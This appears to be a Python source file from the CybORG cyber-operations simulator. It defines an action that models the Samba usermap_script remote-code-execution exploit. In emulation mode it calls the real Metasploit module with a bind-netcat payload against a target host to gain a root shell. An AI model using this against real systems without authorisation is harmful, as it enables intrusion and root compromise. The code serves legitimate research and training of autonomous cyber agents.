# Copyright DST Group. Licensed under the MIT license.
from ipaddress import IPv4Address
from CybORG.Shared.Actions.MSFActionsFolder.RemoteCodeExecutionFolder.RemoteCodeExecution import RemoteCodeExecution

# use msf module exploit/multi/samba/usermap_script, set RHOSTS to target
# could also change LHOST, LPORT and RPORT (default 139)
# gives root session
from CybORG.Shared.Enums import SessionType, ProcessType, ProcessVersion
from CybORG.Shared.Observation import Observation


class SambaUsermapScript(RemoteCodeExecution):
    def __init__(self, ip_address: IPv4Address, session: int, agent: str):
        super().__init__(session=session, agent=agent)
        self.target = ip_address

    def sim_execute(self, state):
        obs = Observation()
        obs.set_success(False)
        if self.session not in state.sessions[self.agent]:
            return obs
        session = state.sessions[self.agent][self.session]

        if session.session_type != SessionType.MSF_SERVER or not session.active:
            return obs

        # find shared subnet of the two hosts
        server_session, server_interface = self.get_local_source_interface(local_session=session, remote_address=self.target)

        if server_interface is None:
            return obs

        server_address = server_interface.ip_address

        if self.target == IPv4Address("127.0.0.1"):
            target_host = server_session.host
        else:
            target_host = state.hosts[state.ip_addresses[self.target]]

        smb_proc = None
        for proc in target_host.processes:
            if proc.process_type == ProcessType.SMB:
                # TODO: In case of SMB that is not the right version, should SMB process be in the obs?
                smb_proc = proc
                break

        # Note that this exploit should actually work for all versions in the range Samba 3.0.20 - 3.0.25rc3
        if smb_proc is not None and smb_proc.version == ProcessVersion.SAMBA_3_0_20_DEB:
            obs.set_success(True)
            obs.add_interface_info(hostid="0", ip_address=server_address)
            obs.add_interface_info(hostid="1", ip_address=str(self.target))
            obs.add_process(hostid="1", local_address=str(self.target), local_port=139, status="open",
                            process_type="smb")

            root_user = None
            for u in state.hosts[state.ip_addresses[self.target]].users:
                if u.username == "root":
                    root_user = u

            target_host.add_process(name="sleep", ppid=1, path="/bin/", user=root_user)
            target_host.add_process(name="telnet", ppid=1, path="/usr/bin/", user=root_user)
            sh_proc = state.hosts[state.ip_addresses[self.target]].add_process(name="sh", ppid=1, path="/bin/", user=root_user)

            new_session = state.add_session(host=target_host.hostname, agent=self.agent,
                                            user="root", session_type="msf shell", parent=server_session)
            process = new_session.process
            process.name = "sh"
            process.ppid = sh_proc.pid
            process.path = sh_proc.path
            process.user = root_user

            local_port = target_host.get_ephemeral_port()
            new_connection = {"local_port": local_port,
                              "Application Protocol": "tcp",
                              "remote_address": server_address,
                              "remote_port": 4444,
                              "local_address": self.target
                              }
            process.connections.append(new_connection)

            target_host.add_process(name="telnet", ppid=1, path="/usr/bin/", user=root_user)
            remote_port = {"local_port": 4444,
                           "Application Protocol": "tcp",
                           "local_address": server_address,
                           "remote_address": self.target,
                           "remote_port": local_port
                           }

            server_session.process.connections.append(remote_port)

            obs.add_process(hostid="0", local_address=server_address, remote_address=str(self.target),
                            local_port=4444, remote_port=local_port)
            obs.add_process(hostid="1", local_address=str(self.target), remote_address=server_address,
                            local_port=local_port, remote_port=4444)
            obs.add_session_info(hostid="1", session_id=new_session.ident, session_type="msf shell", agent=self.agent)

        return obs

    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs
        output = session_handler.execute_exploit(exploit_name='multi/samba/usermap_script', payload='cmd/unix/bind_netcat',
                                         opts={'RHOSTS': str(self.target)})
        obs.add_raw_obs(output)
        obs.set_success(False)
        return obs